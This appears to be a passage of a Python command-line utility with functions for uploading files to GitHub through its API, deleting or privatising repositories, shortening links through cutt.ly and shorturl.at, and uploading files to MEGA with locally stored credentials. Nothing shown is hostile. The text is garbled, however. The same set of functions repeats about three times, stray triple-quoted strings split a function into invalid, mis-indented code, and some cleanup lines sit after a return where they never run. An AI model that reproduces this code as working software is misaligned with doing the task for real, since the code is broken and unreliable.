    file_url = f"{base_url}/repos/{repo_owner}/{repo_name}/contents/{local_file_path}"

    # Prepare the payload
    payload = {
        "message": commit_message,
        "content": encoded_content,
        "branch": branch_name,
    }

    # Send the request to create/update the file
    response = requests.put(file_url, headers=headers, json=payload)

    
   

    if response.status_code == 201:
        pass
        #print(f"Uploaded : {response.status_code}")
        #print(response.json())
    else:
        print('Failed !!')

def upload_files_to_github(username, repository, file_list, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    for file_info in file_list:
        file_path = file_info["file_path"]
        file_content = file_info["file_content"]
        commit_message = f"Upload {file_path}"
        branch_name = "main"  # Replace with the desired branch name if not using 'main'
        
        url = f"{base_url}{file_path}"
        
        # Encode the file content in Base64
        file_content_base64 = base64.b64encode(file_content.encode()).decode()
        
        payload = {
            "message": commit_message,
            "content": file_content_base64,
            "branch": branch_name
        }
        
        response = requests.put(url, headers=headers, json=payload)

        
        
        
        if response.status_code == 201 or response.status_code == 200:
            FrontentTypingInputCode(f"File '{file_path}' uploaded successfully." , 'x')
        else:
            print(f"Failed to upload file '{file_path}'. Status Code: {response.status_code}")
            backie()
        
        

def bhaichange(answer):
    if answer == 'y' or answer=='Y':
        with open('.githubapi.txt','r') as githubfolderwala:
            datafolderwala = githubfolderwala.read().strip()
        with open('.githubapi2.txt','r') as github2wala:
            data2wala = github2wala.read().strip()
        github_username = f"{data2wala}".strip()
        githubinfowala = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Repository Name :  "+r).strip()
        repository_name = f"{githubinfowala}".strip()
        github_token = f"{datafolderwala}".strip()
        meisahab = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Folder name :  "+r).strip()
        os.chdir(meisahab)
        time.sleep(1.0)
        shakar = Main_Setup()
        shakar.oneshotkill()
        FrontentTypingFunction('Uploading files from folder {}'.format(meisahab))
        print('\n')
        for k in os.listdir():
            if Path(f'{k}').is_dir():
                continue
            with open(f'{k}','r') as nicetxt:
                alldata = nicetxt.read()
            file_list = [
                    {
                        "file_path": f"{k}",
                        "file_content": f"{alldata}"
                    },
                ]

            upload_files_to_github(github_username, repository_name, file_list, github_token)
        print('\n')
        FrontentTypingInputCode('All Files Uploaded Successfully From folder {}'.format(meisahab),'x')
        print('\n')
        backie()

def delete_github_repository(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    response = requests.delete(base_url, headers=headers)
    
    if response.status_code == 204:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' deleted successfully.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to delete repository. Status Code: {response.status_code}")
        print(response.json())
        exit()

def make_repository_private(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "private": True
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' set to private.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to set repository to private. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_repository_description(username, repository, description, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "description": description
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository description updated successfully.")
    elif response.status_code == 404:
        print(f"Repository not found.")
    else:
        print(f"Failed to update repository description. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_readme_in_repository(username, repository, new_readme_content, commit_message, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/README.md"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    # Get the current README content
    response = requests.get(base_url, headers=headers)
    response_json = response.json()
    current_readme_content = b64encode(response_json['content'].encode()).decode()
    
    # Update the content if it's different
    if current_readme_content != b64encode(new_readme_content.encode()).decode():
        payload = {
            "message": commit_message,
            "content": b64encode(new_readme_content.encode()).decode(),
            "sha": response_json['sha']
        }
        update_response = requests.put(base_url, headers=headers, json=payload)
        if update_response.status_code == 200:
            print('\n')
            FrontentTypingFunction("README updated successfully.")
        else:
            print(f"Failed to update README. Status Code: {update_response.status_code}")
            print(update_response.json())
            exit()
    else:
        print("No changes detected in README.")
        print('\n')
        backie()

def shorturllop(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)

    response = requests.post('https://cutt.ly/scripts/shortenUrl.php', cookies=cookies, headers=headers, data=data)

    content = response.content

    with open('last.txt','w') as oi:
        oi.write(str(content))

    with open('last.txt','r') as lj:
        data5 = lj.read()

    yy = data5.split("'")
    return yy[1]
    
    os.remove('last.txt')
    os.remove('samaybhai.txt')

def upload_multiple_to_mega(email, password, files):
    mega = Mega()
    m = mega.login(email, password)
    
    for file_path in files:
        m.upload(file_path)
        FrontentTypingFunction(f"Uploaded: {file_path}")

def mainsystemlink():
    money = Main_Setup()
    money.oneshotkill()
    with open('.mega.txt','r') as megaread:
        megareads = megaread.readlines()

    emptybhai = {}

    for i in megareads:
        jsplit = i.split('\t')
        emptybhai[jsplit[0]] = jsplit[1]

    emptybhai = { x.translate({32:None}) : y
        for x, y in emptybhai.items()}


    mega_email = f"{emptybhai.get('Username')}".strip()
    mega_password = f"{emptybhai.get('Password')}".strip()

    with open('.savenamed.txt','r') as files:
        oksdata = files.readlines()

    # Log in to MEGA
    mega = Mega()
    m = mega.login(mega_email, mega_password)
  

    op = 0
    samay = []

    for line in oksdata:
        samay.append(line.strip())

    filesdirnew = os.path.expanduser('~') + '/'

    newfilenames = []
    osp = 1
    for k in samay:
        Klops = input(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m Enter the Related name file {osp} : "+r).strip()
        newfilenames.append(Klops)
        osp = osp + 1


    money.oneshotkill()


    # Upload the file and get its handle

    for i in samay:
        file_handle = m.upload(samay[op])
        
        

        # Get the public download link
        download_link = m.get_upload_link(file_handle)

        with open(f'{filesdirnew}.bash_mega.txt','a') as filesnewcontent:
                
                filesnewcontent.write(f'{newfilenames[op]} 	 {download_link}\n')
        

        print(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m link -> "+Fore.RED+f"{samay[op]}: "+Fore.GREEN+str(shorturllop(download_link)))

        op = op + 1
        
    
     
    os.remove('.savenamed.txt')
    print('\n')
    backie()
    


def shorturl(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)


'''
# ----------------------------------
'''

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        return value
       
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')


def shorturlsnew(link):
    cookies = {
    '_ga': 'GA1.2.1841157735.1660546435',
    '_gid': 'GA1.2.1926940915.1660546435',
    '_gat_gtag_UA_31391210_44': '1',
    }

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        print('\n')
        FrontentTypingFunction('└─[ ✔ ] Success')
        FrontentTypingFunction(f"└─[ ✔ ] Link : "+Fore.GREEN+f"{value}")
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')

def upload_file_to_github(access_token, repo_owner, repo_name, local_file_path, branch_name, commit_message):
    # Base URL for the GitHub API
    base_url = "https://api.github.com"

    # Set up headers with authentication
    headers = {
        "Authorization": f"token {access_token}"
    }

    # Read the file content and encode it to Base64
    with open(local_file_path, "rb") as file:
        content = file.read()
        encoded_content = base64.b64encode(content).decode()

    # API endpoint to create or update a file
    file_url = f"{base_url}/repos/{repo_owner}/{repo_name}/contents/{local_file_path}"

    # Prepare the payload
    payload = {
        "message": commit_message,
        "content": encoded_content,
        "branch": branch_name,
    }

    # Send the request to create/update the file
    response = requests.put(file_url, headers=headers, json=payload)

    
   

    if response.status_code == 201:
        pass
        #print(f"Uploaded : {response.status_code}")
        #print(response.json())
    else:
        print('Failed !!')

def upload_files_to_github(username, repository, file_list, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    for file_info in file_list:
        file_path = file_info["file_path"]
        file_content = file_info["file_content"]
        commit_message = f"Upload {file_path}"
        branch_name = "main"  # Replace with the desired branch name if not using 'main'
        
        url = f"{base_url}{file_path}"
        
        # Encode the file content in Base64
        file_content_base64 = base64.b64encode(file_content.encode()).decode()
        
        payload = {
            "message": commit_message,
            "content": file_content_base64,
            "branch": branch_name
        }
        
        response = requests.put(url, headers=headers, json=payload)

        
        
        
        if response.status_code == 201 or response.status_code == 200:
            FrontentTypingInputCode(f"File '{file_path}' uploaded successfully." , 'x')
        else:
            print(f"Failed to upload file '{file_path}'. Status Code: {response.status_code}")
            backie()
        
        

def bhaichange(answer):
    if answer == 'y' or answer=='Y':
        with open('.githubapi.txt','r') as githubfolderwala:
            datafolderwala = githubfolderwala.read().strip()
        with open('.githubapi2.txt','r') as github2wala:
            data2wala = github2wala.read().strip()
        github_username = f"{data2wala}".strip()
        githubinfowala = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Repository Name :  "+r).strip()
        repository_name = f"{githubinfowala}".strip()
        github_token = f"{datafolderwala}".strip()
        meisahab = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Folder name :  "+r).strip()
        os.chdir(meisahab)
        time.sleep(1.0)
        shakar = Main_Setup()
        shakar.oneshotkill()
        FrontentTypingFunction('Uploading files from folder {}'.format(meisahab))
        print('\n')
        for k in os.listdir():
            if Path(f'{k}').is_dir():
                continue
            with open(f'{k}','r') as nicetxt:
                alldata = nicetxt.read()
            file_list = [
                    {
                        "file_path": f"{k}",
                        "file_content": f"{alldata}"
                    },
                ]

            upload_files_to_github(github_username, repository_name, file_list, github_token)
        print('\n')
        FrontentTypingInputCode('All Files Uploaded Successfully From folder {}'.format(meisahab),'x')
        print('\n')
        backie()

def delete_github_repository(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    response = requests.delete(base_url, headers=headers)
    
    if response.status_code == 204:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' deleted successfully.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to delete repository. Status Code: {response.status_code}")
        print(response.json())
        exit()

def make_repository_private(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "private": True
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' set to private.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to set repository to private. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_repository_description(username, repository, description, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "description": description
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository description updated successfully.")
    elif response.status_code == 404:
        print(f"Repository not found.")
    else:
        print(f"Failed to update repository description. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_readme_in_repository(username, repository, new_readme_content, commit_message, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/README.md"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    # Get the current README content
    response = requests.get(base_url, headers=headers)
    response_json = response.json()
    current_readme_content = b64encode(response_json['content'].encode()).decode()
    
    # Update the content if it's different
    if current_readme_content != b64encode(new_readme_content.encode()).decode():
        payload = {
            "message": commit_message,
            "content": b64encode(new_readme_content.encode()).decode(),
            "sha": response_json['sha']
        }
        update_response = requests.put(base_url, headers=headers, json=payload)
        if update_response.status_code == 200:
            print('\n')
            FrontentTypingFunction("README updated successfully.")
        else:
            print(f"Failed to update README. Status Code: {update_response.status_code}")
            print(update_response.json())
            exit()
    else:
        print("No changes detected in README.")
        print('\n')
        backie()

def shorturllop(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)

    response = requests.post('https://cutt.ly/scripts/shortenUrl.php', cookies=cookies, headers=headers, data=data)

    content = response.content

    with open('last.txt','w') as oi:
        oi.write(str(content))

    with open('last.txt','r') as lj:
        data5 = lj.read()

    yy = data5.split("'")
    return yy[1]
    
    os.remove('last.txt')
    os.remove('samaybhai.txt')

def upload_multiple_to_mega(email, password, files):
    mega = Mega()
    m = mega.login(email, password)
    
    for file_path in files:
        m.upload(file_path)
        FrontentTypingFunction(f"Uploaded: {file_path}")

def mainsystemlink():
    money = Main_Setup()
    money.oneshotkill()
    with open('.mega.txt','r') as megaread:
        megareads = megaread.readlines()

    emptybhai = {}

    for i in megareads:
        jsplit = i.split('\t')
        emptybhai[jsplit[0]] = jsplit[1]

    emptybhai = { x.translate({32:None}) : y
        for x, y in emptybhai.items()}


    mega_email = f"{emptybhai.get('Username')}".strip()
    mega_password = f"{emptybhai.get('Password')}".strip()

    with open('.savenamed.txt','r') as files:
        oksdata = files.readlines()

    # Log in to MEGA
    mega = Mega()
    m = mega.login(mega_email, mega_password)
  

    op = 0
    samay = []

    for line in oksdata:
        samay.append(line.strip())

    filesdirnew = os.path.expanduser('~') + '/'

    newfilenames = []
    osp = 1
    for k in samay:
        Klops = input(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m Enter the Related name file {osp} : "+r).strip()
        newfilenames.append(Klops)
        osp = osp + 1


    money.oneshotkill()


    # Upload the file and get its handle

    for i in samay:
        file_handle = m.upload(samay[op])
        
        

        # Get the public download link
        download_link = m.get_upload_link(file_handle)

        with open(f'{filesdirnew}.bash_mega.txt','a') as filesnewcontent:
                
                filesnewcontent.write(f'{newfilenames[op]} 	 {download_link}\n')
        

        print(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m link -> "+Fore.RED+f"{samay[op]}: "+Fore.GREEN+str(shorturllop(download_link)))

        op = op + 1
        
    
     
    os.remove('.savenamed.txt')
    print('\n')
    backie()
    


def shorturl(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)


'''
'''

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        return value
       
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')


def shorturlsnew(link):
    cookies = {
    '_ga': 'GA1.2.1841157735.1660546435',
    '_gid': 'GA1.2.1926940915.1660546435',
    '_gat_gtag_UA_31391210_44': '1',
    }

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        print('\n')
        FrontentTypingFunction('└─[ ✔ ] Success')
        FrontentTypingFunction(f"└─[ ✔ ] Link : "+Fore.GREEN+f"{value}")
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')

def upload_file_to_github(access_token, repo_owner, repo_name, local_file_path, branch_name, commit_message):
    # Base URL for the GitHub API
    base_url = "https://api.github.com"

    # Set up headers with authentication
    headers = {
        "Authorization": f"token {access_token}"
    }

    # Read the file content and encode it to Base64
    with open(local_file_path, "rb") as file:
        content = file.read()
        encoded_content = base64.b64encode(content).decode()

    # API endpoint to create or update a file
    file_url = f"{base_url}/repos/{repo_owner}/{repo_name}/contents/{local_file_path}"

    # Prepare the payload
    payload = {
        "message": commit_message,
        "content": encoded_content,
        "branch": branch_name,
    }

    # Send the request to create/update the file
    response = requests.put(file_url, headers=headers, json=payload)

    
   

    if response.status_code == 201:
        pass
        #print(f"Uploaded : {response.status_code}")
        #print(response.json())
    else:
        print('Failed !!')

def upload_files_to_github(username, repository, file_list, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    for file_info in file_list:
        file_path = file_info["file_path"]
        file_content = file_info["file_content"]
        commit_message = f"Upload {file_path}"
        branch_name = "main"  # Replace with the desired branch name if not using 'main'
        
        url = f"{base_url}{file_path}"
        
        # Encode the file content in Base64
        file_content_base64 = base64.b64encode(file_content.encode()).decode()
        
        payload = {
            "message": commit_message,
            "content": file_content_base64,
            "branch": branch_name
        }
        
        response = requests.put(url, headers=headers, json=payload)

        
        
        
        if response.status_code == 201 or response.status_code == 200:
            FrontentTypingInputCode(f"File '{file_path}' uploaded successfully." , 'x')
        else:
            print(f"Failed to upload file '{file_path}'. Status Code: {response.status_code}")
            backie()
        
        

def bhaichange(answer):
    if answer == 'y' or answer=='Y':
        with open('.githubapi.txt','r') as githubfolderwala:
            datafolderwala = githubfolderwala.read().strip()
        with open('.githubapi2.txt','r') as github2wala:
            data2wala = github2wala.read().strip()
        github_username = f"{data2wala}".strip()
        githubinfowala = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Repository Name :  "+r).strip()
        repository_name = f"{githubinfowala}".strip()
        github_token = f"{datafolderwala}".strip()
        meisahab = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Folder name :  "+r).strip()
        os.chdir(meisahab)
        time.sleep(1.0)
        shakar = Main_Setup()
        shakar.oneshotkill()
        FrontentTypingFunction('Uploading files from folder {}'.format(meisahab))
        print('\n')
        for k in os.listdir():
            if Path(f'{k}').is_dir():
                continue
            with open(f'{k}','r') as nicetxt:
                alldata = nicetxt.read()
            file_list = [
                    {
                        "file_path": f"{k}",
                        "file_content": f"{alldata}"
                    },
                ]

            upload_files_to_github(github_username, repository_name, file_list, github_token)
        print('\n')
        FrontentTypingInputCode('All Files Uploaded Successfully From folder {}'.format(meisahab),'x')
        print('\n')
        backie()

def delete_github_repository(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    response = requests.delete(base_url, headers=headers)
    
    if response.status_code == 204:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' deleted successfully.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to delete repository. Status Code: {response.status_code}")
        print(response.json())
        exit()

def make_repository_private(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "private": True
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' set to private.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to set repository to private. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_repository_description(username, repository, description, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "description": description
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository description updated successfully.")
    elif response.status_code == 404:
        print(f"Repository not found.")
    else:
        print(f"Failed to update repository description. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_readme_in_repository(username, repository, new_readme_content, commit_message, token):
